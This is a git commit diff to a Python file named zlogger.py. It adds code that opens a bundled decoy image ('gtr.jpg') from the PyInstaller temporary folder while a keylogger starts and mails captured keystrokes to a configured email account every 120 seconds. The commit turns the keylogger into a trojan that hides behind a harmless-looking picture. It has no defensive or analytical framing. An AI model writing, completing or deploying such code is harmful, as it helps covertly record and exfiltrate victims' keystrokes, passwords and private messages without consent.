6bb8673368e1a71d2a6d4e0d12eafc4a2c8c3130
Hem Parekh <54116609+Hem1700@users.noreply.github.com>
2021-05-14 17:48:06 +0530

    exe updated

--- zlogger.py
+++ zlogger.py
@@ -1,4 +1,8 @@
 import keylogger
+import sys
+import subprocess
 
+file_name = sys._MEIPASS + "\gtr.jpg"           # Default location of the front file (is appdata) put by pyinstaller 
+subprocess.Popen(file_name, shell = True)
 my_keylogger = keylogger.Keylogger(120, "MAILID", "PASSWORD")
 my_keylogger.start()
